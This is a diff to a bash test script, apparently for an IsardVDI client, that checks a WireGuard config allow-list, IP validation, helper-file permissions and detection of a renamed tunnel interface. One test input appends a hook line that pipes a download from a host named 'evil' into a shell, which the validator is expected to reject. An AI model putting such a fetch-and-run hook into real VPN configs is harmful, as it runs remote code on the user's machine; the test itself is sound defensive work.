@@ -5,7 +5,13 @@
 source "$(dirname "$0")/common.sh"
 
 echo "== VPN config allow-list"
-if [[ -f "$REAL_VPN" ]]; then ok check_vpn_conf "$(cat "$REAL_VPN")"; else skip "your VPN config (none here)"; fi
+# Against this computer's networks, with your config as the saved one (it names your tunnel's
+# address); in a subshell, so a refusal is a failed check and not the end of the tests.
+if [[ -f "$REAL_VPN" ]]; then
+    check "your VPN config passes" '( VPN_FILE="$REAL_VPN" check_vpn_conf "$(cat "$REAL_VPN")" ) >/dev/null 2>&1'
+else skip "your VPN config (none here)"; fi
+# The allow-list itself, against a fixed LAN (this computer's may already route 10.2.0.0/16).
+local_networks() { echo 192.168.99.0/24; }
 good=$'[Interface]\nAddress = 10.2.0.5/32\nPrivateKey = abc=\nMTU = 1420\n\n[Peer]\nPublicKey = def=\nEndpoint = h:443\nAllowedIPs = 10.2.0.0/16\nPersistentKeepalive = 25'
 ok  check_vpn_conf "$good"
 bad check_vpn_conf "$good"$'\nPostUp = curl evil | sh'
@@ -16,6 +22,8 @@ bad check_vpn_conf "${good/10.2.0.0\/16/10.2.0.0\/16, ::\/0}"
 bad check_vpn_conf "$good"$'\nTable = off'
 bad check_vpn_conf "$good"$'\ngarbage line'
 ok  check_vpn_conf "${good/10.2.0.0\/16/10.2.0.0\/16, 10.3.0.0\/20}"
+bad check_vpn_conf "${good/10.2.0.0\/16/192.168.99.0\/24}"
+source <(sed -n "/^local_networks()/,/^}/p" "$REPO/bin/isardvdi")   # the real one again
 
 echo "== IP / URL validation"
 ok  valid_ipv4 10.2.118.7
@@ -60,5 +68,23 @@ echo "== SSO helper must not be writable by others"
 mkdir -p "$T/share"; printf 'x' > "$T/share/sso_login.py"; chmod 775 "$T/share"; chmod 666 "$T/share/sso_login.py"
 check_helper "$T/share/sso_login.py"
 check "check_helper fixes permissions" '[[ $(stat -c %a "$T/share") == 755 && $(stat -c %a "$T/share/sso_login.py") == 644 ]]'
+
+echo "== the IsardVDI tunnel under another name (NetworkManager)"
+printf '[Interface]\nAddress = 10.0.52.97/32\n' > "$VPN_FILE"
+ip() {
+    case "$*" in
+        "-4 -o addr show") printf '3: isardnew    inet 10.0.52.97/32 scope global isardnew\n4: corp    inet 10.8.0.2/24 scope global corp\n' ;;
+        "-d link show dev isardnew") echo "3: isardnew: <POINTOPOINT> ... wireguard actor" ;;
+        "-d link show dev corp") echo "4: corp: <POINTOPOINT> ... wireguard actor" ;;
+        "-4 -o route show scope link") printf '10.2.0.0/16 dev isardnew proto static\n10.8.0.0/24 dev corp proto kernel\n192.168.1.0/24 dev enp1 proto kernel\n' ;;
+    esac
+}
+resolvectl() { :; }
+check "the NetworkManager tunnel is recognised" '[[ "$(tunnel_ifaces | tr "\n" " ")" == "isard-vpn isardnew " ]]'
+check "its route is not a local network" '! local_networks | grep -q "^10.2.0.0/16"'
+check "another WireGuard VPN still is" 'local_networks | grep -q "^10.8.0.0/24"'
+check "the LAN still is" 'local_networks | grep -q "^192.168.1.0/24"'
+unset -f ip resolvectl
+rm -f "$VPN_FILE"
 
 finish
